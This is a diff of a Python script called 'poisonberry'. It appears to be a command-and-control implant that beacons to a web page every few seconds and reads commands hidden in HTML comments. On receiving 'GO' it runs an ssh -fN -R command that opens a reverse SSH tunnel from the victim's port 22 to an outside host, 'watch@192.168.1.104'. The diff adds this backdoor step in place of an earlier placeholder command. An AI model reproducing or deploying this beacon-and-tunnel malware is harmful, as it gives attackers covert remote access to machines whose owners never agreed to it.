@@ -1,20 +1,26 @@
 import urllib.request
+import urllib.error
 import urllib.parse
 import time
 import socket
 import os
 import sys
 from bs4 import BeautifulSoup, Comment
+from utils import *
+
+
+
 
 class poisonberry:
 
     def __init__(self):
         self.endpoint = {}
         self.beacon = True
+        self.home = "watch@192.168.1.104"
         self.data= {}
         self.command={}
         self.run={}
-        self.port={}
+        self.port=22
 
     def art(self):
         print("""\                            
@@ -31,7 +37,7 @@ class poisonberry:
                                             ,""       \ 
                                           ,"  ## |   ಠ ಠ. 
                                         ," ##   ,-\__    `.
-                                      ,"       /     `--._;)
+                                      ,"       /     `--._;) Why tho
                                     ,"     ## /
                                   ,"   ##    /
                                   
@@ -40,15 +46,18 @@ class poisonberry:
         time.sleep(5)
 
     def start(self):
-        self.art()
-        while True:
-            while self.beacon == True:
-                self.GET()
-                self.tryPort()
-                time.sleep(30)
+       # self.art()
+        while True: # run forever
+            while self.beacon == True:  # while we need a beacon
+                self.GET()              # http beacon
+                log(INFO,"pausing before next beacon")
+                time.sleep(5)           # sleep between beacons
+            self.tryPort()              # validate port is free, enable beacon if it is
+            log(INFO,"pausing before checking ports")
+            time.sleep(5)               # sleep between socket checks
+
 
     def tryPort(self):
-        self.port=2222
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         result = False
         try:
@@ -75,37 +84,54 @@ class poisonberry:
 
 
     def handle_request(self):
-        self.endpoint = "http://localhost:8000/site.html"
-        self.data = urllib.request.urlopen(self.endpoint)
+        try:
+                log(INFO,"trying to GET from %s"%(self.endpoint))
+                self.endpoint = "http://localhost:8000/site2.html"
+                self.data = urllib.request.urlopen(self.endpoint)
 
-        self.parse_response()
+                self.parse_response()
+        except urllib.error.URLError as e:
+                log(WARN,"failed to connect to %s, error %s" %(self.endpoint, e.__dict__))
+               # print(e.__dict__)
 
     def parse_response(self):
         self.data=self.data.read().decode('utf-8')
-        print(self.data)
+        log(DEBUG,"data received %s" %(self.data))
+        #print(self.data)
 
         soup = BeautifulSoup(self.data, 'lxml')
-
         comments = soup.findAll(text=lambda text:isinstance(text, Comment))
-       # print(type(comments))
-       # print(comments)
         self.command = str(comments).split(":",1)[1][:-3]
-        print(self.command)
+        log(INFO,"command received %s"% (self.command))
+      #  print(self.command)
+
         self.process_command()
 
     def process_command(self):
         print(self.command)
         if self.command != "GO":
-            print("chicken")
+            log(INFO,"no command given")
         else:
-            cmd = 'ls -la >out.txt' #TODO replace with ssh tunnel
-            print(cmd)
-            if self.run!= 1:# TODO not this, we need a better way to not run a command multiple times when run
+            if self.tryPort() == True:
+
+                cmd = '/usr/bin/ssh -fN -R 7888:localhost:'+str(self.port) + " " + self.home # TODO replace with ssh tunnel
+                print(cmd)
+                os.system(cmd)
+                log(DEBUG,"running")
+
+            else:
+                log(DEBUG,"port not free, do nothing")
+
+            #old idea of if run once ignore subsequent commands, untested so idk if we need this still
+            '''
+            if self.run != 1: # TODO not this, we need a better way to not run a command multiple times when run
                 os.system(cmd)
                 self.run =1
                 self.beacon = False
             else:
+                log(DEBUG,"running")
                 print("running")
+            '''
 c=poisonberry()
 
 c.start()
